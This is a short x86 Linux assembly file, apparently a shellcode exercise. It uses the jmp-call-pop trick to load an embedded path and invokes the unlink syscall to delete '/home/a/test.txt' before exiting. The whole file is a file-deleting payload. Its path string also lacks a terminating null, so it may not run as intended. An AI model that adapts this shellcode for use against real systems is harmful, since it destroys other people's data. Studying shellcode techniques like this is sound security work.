global _start

_start:

        jmp short call_shellcode
              shellcode:
              pop esi
              xor eax,eax
              xor ecx,ecx
              xor edx,edx
              mov al,0xa
              mov ebx,esi
              int 0x80
              mov al,0x1
              int 0x80
  	
        call_shellcode:      
              call shellcode
              path_to_file  db "/home/a/test.txt"


